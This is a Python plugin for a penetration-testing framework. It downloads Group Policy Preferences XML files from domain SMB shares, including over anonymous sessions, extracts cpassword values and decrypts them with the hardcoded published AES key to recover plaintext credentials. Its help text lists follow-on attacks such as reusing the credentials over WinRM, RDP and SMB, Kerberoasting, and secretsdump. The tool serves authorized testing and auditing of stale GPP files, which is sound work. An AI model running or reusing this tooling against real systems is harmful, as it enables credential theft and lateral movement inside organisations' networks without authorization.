#!/usr/bin/env python3
"""
GPP (Group Policy Preferences) credential extraction plugin.

Downloads GPP XML files from SMB shares and extracts/decrypts cPassword values.
"""

import os
import re
import subprocess
import tempfile
from typing import Any, Dict, List, Optional

from .plugin_base import PluginBase

HELP = {
    "name": "GPP Extract — Group Policy Preferences Credential Extraction",
    "description": (
        "Extracts and decrypts credentials from Group Policy Preferences (GPP) XML files.\n\n"
        "GPP files (Groups.xml, ScheduledTasks.xml, etc.) often contain encrypted passwords.\n"
        "Microsoft published the AES key used for encryption (MS14-025), making these\n"
        "passwords trivially decryptable.\n\n"
        "This tool:\n"
        "- Downloads GPP XML files from SMB shares via smbclient\n"
        "- Extracts cpassword attributes from the XML\n"
        "- Decrypts using gpp-decrypt (or built-in Python fallback)\n"
        "- Stores plaintext credentials in the database\n\n"
        "Common GPP file locations:\n"
        "- \\\\DC\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n"
        "- \\\\DC\\Replication\\...\\Preferences\\Groups\\Groups.xml\n"
    ),
    "usage": 'souleyez jobs enqueue gpp_extract <target> --args "--share <share> --path <path>"',
    "examples": [
        'souleyez jobs enqueue gpp_extract 10.10.10.100 --args "--share Replication --path active.htb/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"',
        'souleyez jobs enqueue gpp_extract 192.168.1.1 --args "--share SYSVOL --path domain.local/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml --user admin --password Pass123"',
    ],
    "flags": [
        ["--share <name>", "SMB share name (e.g., SYSVOL, Replication)"],
        ["--path <path>", "Path to GPP file within the share"],
        ["--host <ip>", "Target host (defaults to target argument)"],
        ["--user <name>", "Username for authenticated access (optional)"],
        ["--password <pass>", "Password for authenticated access (optional)"],
    ],
    "presets": [
        {
            "name": "Anonymous",
            "args": [],
            "desc": "Extract using anonymous/null session",
        },
        {
            "name": "Authenticated",
            "args": ["--user", "USER", "--password", "PASS"],
            "desc": "Extract with credentials",
        },
    ],
    "help_sections": [
        {
            "title": "What is GPP Password Extraction?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Group Policy Preferences (GPP) can store encrypted passwords",
                        "Microsoft published the AES key (MS14-025) - passwords are trivially decryptable!",
                        "Found in SYSVOL/Replication shares on domain controllers",
                    ],
                ),
                (
                    "Why This Works",
                    [
                        "GPP was designed to set local admin passwords via Group Policy",
                        "The encryption key was meant to be secret but was published in MSDN docs",
                        "Despite being 'patched', old GPP files often remain on DCs",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Anonymous Access",
                    [
                        'souleyez jobs enqueue gpp_extract 10.10.10.100 --args "--share Replication --path active.htb/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"',
                        "  → Downloads and decrypts GPP file via null session",
                    ],
                ),
                (
                    "With Credentials",
                    [
                        'souleyez jobs enqueue gpp_extract 10.10.10.100 --args "--share SYSVOL --path domain/Policies/{GUID}/... --user admin --password Pass123"',
                        "  → Uses credentials to access the share",
                    ],
                ),
            ],
        },
        {
            "title": "Finding GPP Files",
            "color": "yellow",
            "content": [
                (
                    "Common Locations",
                    [
                        "\\\\DC\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml",
                        "\\\\DC\\SYSVOL\\domain\\Policies\\{GUID}\\User\\Preferences\\Groups\\Groups.xml",
                        "\\\\DC\\Replication\\...\\Preferences\\Groups\\Groups.xml",
                    ],
                ),
                (
                    "GPP File Types",
                    [
                        "Groups.xml - Local group membership and passwords",
                        "Services.xml - Service account credentials",
                        "ScheduledTasks.xml - Scheduled task credentials",
                        "DataSources.xml - Database connection strings",
                        "Drives.xml - Mapped drive credentials",
                    ],
                ),
                (
                    "Discovery Workflow",
                    [
                        "1. Run smbmap to enumerate shares",
                        "2. Look for SYSVOL or Replication with read access",
                        "3. Browse Policies folders for Preferences directories",
                        "4. Auto-chains will trigger this tool when GPP files found",
                    ],
                ),
            ],
        },
        {
            "title": "After Getting Credentials",
            "color": "magenta",
            "content": [
                (
                    "Next Steps",
                    [
                        "Try credentials on SMB, WinRM, RDP, LDAP",
                        "Check if account has special privileges (Domain Admin?)",
                        "Use for Kerberoasting if it's a service account",
                        "Run secretsdump to extract more credentials",
                    ],
                ),
            ],
        },
    ],
}


class GppExtractPlugin(PluginBase):
    """Plugin for extracting credentials from GPP XML files."""

    name = "gpp_extract"
    display_name = "GPP Extract"
    description = (
        "Extract and decrypt credentials from Group Policy Preferences XML files"
    )
    category = "credentials"
    HELP = HELP

    examples = [
        'souleyez jobs enqueue gpp_extract 10.10.10.100 --args "--share Replication --path active.htb/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"',
    ]

    def build_command(
        self,
        target: str,
        args: List[str] = None,
        wordlist: str = None,
        label: str = None,
    ) -> Dict[str, Any]:
        """
        Build the command to download and extract GPP credentials.

        Args format:
            --share <share_name>
            --path <path_to_gpp_file>
            --host <host> (optional, defaults to target)
            --user <username> (optional)
            --password <password> (optional)
        """
        args = args or []

        # Parse args
        share = None
        path = None
        host = target
        user = ""
        password = ""

        i = 0
        while i < len(args):
            if args[i] == "--share" and i + 1 < len(args):
                share = args[i + 1]
                i += 2
            elif args[i] == "--path" and i + 1 < len(args):
                path = args[i + 1]
                i += 2
            elif args[i] == "--host" and i + 1 < len(args):
                host = args[i + 1]
                i += 2
            elif args[i] == "--user" and i + 1 < len(args):
                user = args[i + 1]
                i += 2
            elif args[i] == "--password" and i + 1 < len(args):
                password = args[i + 1]
                i += 2
            else:
                i += 1

        if not share or not path:
            return {
                "cmd": ["echo", "Error: --share and --path are required"],
                "timeout": 10,
            }

        # Build smbclient command to download the file
        # We'll use a wrapper script approach since we need to parse output
        smb_path = f"//{host}/{share}"

        # Credential args
        cred_args = "-N"  # No password (anonymous)
        if user:
            cred_args = f"-U '{user}%{password}'"

        # Build smbclient get command
        cmd = [
            "bash",
            "-c",
            f"""
set -e
echo "=== GPP Credential Extraction ==="
echo "Host: {host}"
echo "Share: {share}"
echo "Path: {path}"
echo ""

# Create temp directory for download
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# Download the GPP file
echo "[*] Downloading GPP file..."
smbclient '{smb_path}' {cred_args} -c "get \\"{path}\\" \\"$TMPDIR/gpp.xml\\"" 2>&1 || true

if [ ! -f "$TMPDIR/gpp.xml" ]; then
    echo "[-] Failed to download GPP file"
    echo "[-] Trying alternative path format..."
    # Try without leading path component
    ALTPATH=$(echo "{path}" | sed 's|^[^/]*/||')
    smbclient '{smb_path}' {cred_args} -c "get \\"$ALTPATH\\" \\"$TMPDIR/gpp.xml\\"" 2>&1 || true
fi

if [ ! -f "$TMPDIR/gpp.xml" ]; then
    echo "[-] Failed to download GPP file"
    exit 1
fi

echo "[+] Downloaded GPP file successfully"
echo ""
echo "=== GPP File Contents ==="
cat "$TMPDIR/gpp.xml"
echo ""
echo ""

# Extract cPassword using grep/sed
echo "=== Extracting Credentials ==="
CPASSWORD=$(grep -oP 'cpassword="\\K[^"]+' "$TMPDIR/gpp.xml" 2>/dev/null || true)
USERNAME=$(grep -oP 'userName="\\K[^"]+' "$TMPDIR/gpp.xml" 2>/dev/null || true)
NEWNAME=$(grep -oP 'newName="\\K[^"]+' "$TMPDIR/gpp.xml" 2>/dev/null || true)

if [ -z "$CPASSWORD" ]; then
    # Try alternative attribute names
    CPASSWORD=$(grep -oP 'cPassword="\\K[^"]+' "$TMPDIR/gpp.xml" 2>/dev/null || true)
fi

if [ -z "$USERNAME" ]; then
    USERNAME=$(grep -oP 'runAs="\\K[^"]+' "$TMPDIR/gpp.xml" 2>/dev/null || true)
fi

if [ -n "$USERNAME" ]; then
    echo "[+] Username: $USERNAME"
fi
if [ -n "$NEWNAME" ]; then
    echo "[+] New Name: $NEWNAME"
fi

if [ -z "$CPASSWORD" ]; then
    echo "[-] No cpassword found in GPP file"
    exit 0
fi

echo "[+] Encrypted Password (cpassword): $CPASSWORD"
echo ""

# Decrypt using gpp-decrypt
echo "=== Decrypting Password ==="
if command -v gpp-decrypt &> /dev/null; then
    PLAINTEXT=$(gpp-decrypt "$CPASSWORD" 2>&1)
    if [ -n "$PLAINTEXT" ]; then
        echo "[+] Decrypted Password: $PLAINTEXT"
        echo ""
        echo "=== CREDENTIALS FOUND ==="
        echo "Username: $USERNAME"
        echo "Password: $PLAINTEXT"
        echo "========================="
    else
        echo "[-] gpp-decrypt failed to decrypt"
    fi
else
    echo "[-] gpp-decrypt not found, trying Python decryption..."
    # Fallback: Python-based decryption
    python3 -c "
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Microsoft published AES key for GPP
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
cpassword = '$CPASSWORD'

# Add padding if needed
cpassword += '=' * (4 - len(cpassword) % 4)
encrypted = base64.b64decode(cpassword)

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv=b'\\x00' * 16)
decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
print('[+] Decrypted Password:', decrypted.decode('utf-16-le').rstrip('\\x00'))
print()
print('=== CREDENTIALS FOUND ===')
print('Username: $USERNAME')
print('Password:', decrypted.decode('utf-16-le').rstrip('\\x00'))
print('=========================')
" 2>&1 || echo "[-] Python decryption failed - install pycryptodome: pip install pycryptodome"
fi
""",
        ]

        return {"cmd": cmd, "timeout": 120}

    def get_timeout(self, args: List[str] = None) -> int:
        """Return timeout in seconds."""
        return 120  # 2 minutes should be plenty

    def parse_output(
        self,
        output: str,
        target: str,
        args: List[str] = None,
    ) -> Dict[str, Any]:
        """Parse gpp_extract output for credentials."""
        result = {
            "tool": "gpp_extract",
            "target": target,
            "credentials": [],
            "gpp_file_found": False,
            "decryption_success": False,
        }

        # Check if GPP file was downloaded
        if "Downloaded GPP file successfully" in output:
            result["gpp_file_found"] = True

        # Extract username
        username_match = re.search(r"Username:\s*(.+?)(?:\n|$)", output)
        username = username_match.group(1).strip() if username_match else None

        # Extract decrypted password
        password_match = re.search(r"Decrypted Password:\s*(.+?)(?:\n|$)", output)
        if password_match:
            result["decryption_success"] = True
            password = password_match.group(1).strip()

            if username and password:
                result["credentials"].append(
                    {
                        "username": username,
                        "password": password,
                        "source": "gpp",
                        "type": "plaintext",
                    }
                )

        # Check for CREDENTIALS FOUND block
        if "=== CREDENTIALS FOUND ===" in output:
            result["decryption_success"] = True

        return result


# Register the plugin
plugin = GppExtractPlugin()
